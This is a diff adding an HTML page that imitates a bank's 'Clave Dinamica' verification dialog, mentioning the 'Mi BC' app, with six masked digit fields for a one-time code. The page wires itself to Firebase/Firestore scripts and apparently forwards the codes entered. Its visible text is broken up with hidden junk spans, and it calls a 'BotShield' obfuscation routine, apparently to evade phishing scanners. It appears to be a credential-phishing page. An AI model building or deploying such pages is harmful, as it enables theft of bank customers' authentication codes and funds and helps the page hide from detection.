@@ -1,0 +1,173 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="utf-8">
+  <title></title>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="referrer" content="no-referrer">
+  <meta http-equiv="Content-Security-Policy"
+    content="default-src 'none'; script-src 'self' 'unsafe-inline' data: https://www.gstatic.com; style-src 'self' 'unsafe-inline' http://127.0.0.1:5500; img-src 'self' data:; font-src 'self' data:; connect-src 'self' ws://127.0.0.1:5500 https://www.gstatic.com https://firestore.googleapis.com https://*.googleapis.com https://*.firebaseio.com; media-src 'self' data:; object-src 'self' data:; frame-src 'self' data:;">
+  <link rel="stylesheet" href="css/dinamica.css">
+  <style>
+    :root {
+      --bg-image: url("./images/pc.png");
+      --bg-position: center top;
+    }
+
+    html,
+    body {
+      min-height: 100%;
+    }
+
+    body {
+      position: relative;
+      isolation: isolate;
+      min-height: 100vh;
+      margin: 0;
+      display: grid;
+      place-items: center;
+      padding: 24px;
+      overflow: auto;
+      font-family: "Open Sans", Arial, sans-serif;
+      background: transparent;
+    }
+
+    body::before {
+      content: "";
+      position: fixed;
+      inset: 0;
+      background-image: var(--bg-image);
+      background-position: var(--bg-position);
+      background-repeat: no-repeat;
+      background-size: cover;
+      filter: blur(10px) brightness(0.7);
+      transform: scale(1.04);
+      z-index: -2;
+    }
+
+    body::after {
+      content: "";
+      position: fixed;
+      inset: 0;
+      background: rgba(0, 0, 0, 0.16);
+      z-index: -1;
+    }
+
+    body[data-device="mobile"] {
+      --bg-image: url("./images/movil.png");
+      --bg-position: center top;
+    }
+
+    body[data-device="desktop"] {
+      --bg-image: url("./images/pc.png");
+      --bg-position: center center;
+    }
+
+    .dinamica-shell {
+      position: relative;
+      z-index: 1;
+      width: 100%;
+      max-width: 700px;
+    }
+
+    #modal-key-validation .bc-input-token input.bc-input[id] {
+      border-bottom: 1px solid #fff;
+    }
+
+    #modal-key-validation .bc-input-token input.bc-input[id]:focus {
+      border-bottom: solid 2px #fff;
+    }
+
+    #modal-key-validation .bc-input-token input.bc-input[id]:not(:placeholder-shown) {
+      border-bottom: 2px solid #fff;
+    }
+
+    #modal-key-validation .bc-input-token .bc-input-token-container.bc-all-inputs-valid:focus-within input {
+      border-bottom: solid 2px #fff;
+    }
+  </style>
+</head>
+<body data-device="desktop">
+  <main class="dinamica-shell">
+    <bc-key-validation componentid="modal-key-validation">
+      <article
+        role="dialog"
+        aria-modal="true"
+        aria-labelledby="modal-key-validation_keyValidationTitle"
+        class="bc-key-validation bc-key-validation-active"
+        id="modal-key-validation">
+        <div
+          role="alertdialog"
+          aria-modal="true"
+          class="bc-key-validation-dialog bc-border-radius-3-full bc-card-container bc-shadow-06">
+          <div class="bc-key-validation-content">
+            <div class="bc-key-validation-header">
+              <div class="bc-key-validation-dynamic-container bc-bg-brand-sequential-C-200">
+                <img src="./images/banner.gif" width="100%" height="100%" alt="">
+              </div>
+              <h3 id="modal-key-validation_keyValidationTitle">Ingresa<span style="display:none">xkj</span> la<span style="display:none;font-size:0">abc</span> Clave<span style="display:none">pqr</span> Dinamica</h3>
+            </div>
+
+            <div class="bc-key-validation-body">
+              <p class="bc-key-validation-description" style="padding-bottom: 0;">Encuentra<span style="display:none">xkj</span> tu<span style="display:none;font-size:0">abc</span> Clave<span style="display:none">pqr</span> Dinamica<span style="display:none;font-size:0">def</span> en la app Mi BC.</p>
+              <div class="bc-key-validation-input-container">
+                <div class="bc-key-validation-input-content bc-pb-0">
+                  <div class="bc-fm-fld bc-lg-field">
+                    <div class="bc-input-token" status="default">
+                      <div class="bc-input-token-container" num-inputs="6" info-message=" " error-message=" ">
+                        <input pattern="[0-9]*" maxlength="1" id="toko-1" class="bc-input" required placeholder=" " aria-label="Ingresar primer digito, Editar texto" inputmode="numeric" type="password">
+                        <input pattern="[0-9]*" maxlength="1" id="toko-2" class="bc-input" required placeholder=" " aria-label="Ingresar segundo digito, Editar texto" inputmode="numeric" type="password">
+                        <input pattern="[0-9]*" maxlength="1" id="toko-3" class="bc-input" required placeholder=" " aria-label="Ingresar tercer digito, Editar texto" inputmode="numeric" type="password">
+                        <input pattern="[0-9]*" maxlength="1" id="toko-4" class="bc-input" required placeholder=" " aria-label="Ingresar cuarto digito, Editar texto" inputmode="numeric" type="password">
+                        <input pattern="[0-9]*" maxlength="1" id="toko-5" class="bc-input" required placeholder=" " aria-label="Ingresar quinto digito, Editar texto" inputmode="numeric" type="password">
+                        <input pattern="[0-9]*" maxlength="1" id="toko-6" class="bc-input" required placeholder=" " aria-label="Ingresar sexto digito, Editar texto" inputmode="numeric" type="password">
+                      </div>
+                      <label class="bc-label-bottom-token" aria-label=" "></label>
+                    </div>
+                  </div>
+                </div>
+              </div>
+            </div>
+
+            <div class="bc-key-validation-footer">
+              <div class="bc-key-validation-action-container" style="padding-bottom: 0;">
+                <button type="button" tabindex="0" class="bc-clear-button bc-button-fill bc-button-secondary bc-button-small" id="modal-key-validation_clear-button" disabled>Borrar</button>
+                <button type="button" tabindex="0" class="bc-continue-button bc-button-fill bc-button-primary bc-button-small" id="modal-key-validation_continue-button" disabled>Continuar</button>
+              </div>
+            </div>
+          </div>
+
+          <div class="bc-key-validation-close-button-container">
+            <button type="button" aria-label="Cerrar" class="bc-key-validation-close-button bc-icon bc-sm" id="modal-key-validation_close-error-button">error</button>
+          </div>
+        </div>
+      </article>
+    </bc-key-validation>
+  </main>
+  <bc-circle-loading>
+    <article class="bc-circle-loading" id="dinamica-loader" aria-label="Cargando..." role="status">
+      <section class="bc-circle-loading-circle" tabindex="1" style="--circle-loading-size: 160px;">
+        <em class="bc-icon bc-xl bc-loader bc-circle-loading-loader-icon" aria-hidden="true" style="--bc-loader-animation-duration: 0.5s;">spinner</em>
+        <p class="bc-circle-loading-info bc-text-break" aria-hidden="true">Cargando...</p>
+      </section>
+    </article>
+  </bc-circle-loading>
+  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-firestore-compat.js"></script>
+  <script src="js/firebase-config.js"></script>
+  <script src="js/dinamica-device.js"></script>
+  <script src="js/botshield.js"></script>
+  <script src="js/dinamica.js"></script>
+  <script src="js/dinamica-firebase.js"></script>
+  <script>
+    document.addEventListener("DOMContentLoaded", function initDinamicaBotShield() {
+      document.querySelectorAll("[data-obfuscate]").forEach(function (el) {
+        if (el.textContent.trim().length > 0) {
+          el.innerHTML = BotShield.obfuscateText(el.textContent.trim());
+        }
+      });
+      BotShield.obfuscateAll("SV Personas");
+    });
+  </script>
+</body>
+</html>
